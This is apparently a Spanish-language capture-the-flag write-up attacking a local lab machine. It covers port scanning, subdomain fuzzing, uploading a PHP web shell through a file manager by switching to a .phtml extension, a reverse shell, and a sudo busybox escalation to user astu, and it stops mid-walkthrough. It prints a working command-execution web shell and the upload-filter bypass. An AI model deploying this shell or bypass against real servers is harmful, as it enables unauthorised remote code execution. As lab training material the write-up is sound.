## Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/cc9f3d9e-c8b9-4428-b9f0-81158e407362)

`nmap` reporta solo un puerto (servicio HTTP), por lo que accedo al servicio web 

![image](https://github.com/user-attachments/assets/ecd822b3-e318-4e48-b178-3545165a4c1e)

me consigo con la plantilla por defecto de apache pero un tanto modificada con informacion, `/var/www/5eEk3r`, lo primero que hare sera agregar en `/etc/hosts`
`5eEk3r` como dominio e intentar acceder a ver si cambia algo

```bash
echo '172.17.0.2 5eEk3r.dl' >> /etc/hosts
```

ahora accedo nuevamente al servicio web


![image](https://github.com/user-attachments/assets/76f15ea2-a3f3-43e3-8c5f-8428c5e2b167)

observo lo mismo, asi que le reliazo fuzzinf web

```bash
feroxbuster -u http://5eek3r.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5
```

![image](https://github.com/user-attachments/assets/9ef94e30-2282-47b7-a4e3-fba9134e385b)

por lo visto no hay nada de interes por lo que intento buscar subdominios

```bash
wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/
```

![image](https://github.com/user-attachments/assets/aa704f75-eaf9-4d7d-8b02-49dd7da65bf6)

agrego dicho subdominio en `/etc/hosts` que quede asi

```bash
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl
```
y preocedo acceder 

![image](https://github.com/user-attachments/assets/299cd8ea-a2aa-4a5e-b513-88c85b7715c7)

me consigo con una web que codifica el texto que le pasemos sustituyendo cada letra por la siguiente en el puerto `14`, inspeccionando la web me consigo con un comentario

![image](https://github.com/user-attachments/assets/ee3cc4de-7833-4b72-83b7-8a50463151c0)

en un principio intentar explotar un `xss` no tiene mucho sentido si el objetivo es intentar acceder al servidor por lo que continuo sin hacer caso al comentario del `xss`.
Esta web no parece tener nada mas asi que continuo buscando subdominios en vista de que no tengo nada mas que intentar

```bash
wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705
```

![image](https://github.com/user-attachments/assets/9d48f1f7-d4c4-4d06-a9c2-db94f50e2727)

obtengo el subdominio `admin` y realizo el mismo procedimiento en `/etc/hosts` y agrego `admin` quedando asi:

```bash
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl admin.crosswords.5eEk3r.dl
```

procedo acceder

![image](https://github.com/user-attachments/assets/36d1e6a9-e65b-41c6-9b93-ef571b890dba)

damos con un administrador de archivos donde es posible eliminar asi como cargar archivos y por lo visto la web interpreta `php` ya que observo un `index.php`, por tal
motivo procedo con la carga de un archivo `php` malicioso

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
cargo el archivo malicioso y me arroja el siguiente mensaje

![image](https://github.com/user-attachments/assets/b38e2f8b-1f5b-46de-9136-ee11bdc85360)

no es posible cargar un archivo `php` directamente pero existen formas, primero intente el bypass modificando la peticion en el `Content-Type` pero el servidor no
esta validando esto sino la extension del archivo por lo que tras ir testeando diferentes extensiones logre dar con la que es posible cargar y sobre todo la extension
que es interpretada como `php` por el servidor.

![image](https://github.com/user-attachments/assets/e0b7e362-9e68-421f-a794-7bf766ad1bfa)

como se observa, la extension es `phtml`; asi que ya cargado el archivo malicioso procedo a obtener la `revershell`

![image](https://github.com/user-attachments/assets/bf4084f1-df45-4bba-90eb-af1a2f17e9f8)


## Escalada de Privilegios

### www-data

tratamiento de la tty

```bash
script /dev/null -c bash 
^z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

veo que puedo ejecutar el binario `busybox` como el usuario `astu`

![image](https://github.com/user-attachments/assets/2bb9e862-7e43-4cac-b696-a794a62f62b8)

asi que para saltar al usuario `astu` ejecutamos lo siguiente

```bash
sudo -u astu /usr/bin/busybox sh
```

### astu

 CONTINUAMOS LUEGO ;) 


































